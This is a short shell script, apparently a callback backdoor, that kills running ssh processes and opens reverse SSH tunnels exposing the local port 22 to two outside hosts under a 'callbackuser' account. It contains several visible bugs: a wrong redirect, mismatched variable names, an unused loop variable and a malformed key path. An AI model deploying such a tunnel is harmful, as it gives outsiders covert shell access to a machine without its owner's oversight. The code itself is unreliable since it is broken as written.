#!/bin/sh
killall ssh >/dev/null 2>$1
sleep 5
REMLIS=5050
REUSR=callbackuser
HOSTS="natgeoanswers.com target-rebates.com"
for host in $HOSTS;
do 
 ssh -R ${REMLIS}:localhost:22 -i "/home/i{$REMUSR}/.ssh/id_rsa" -N ${HOST} -l ${REMUSR};
done
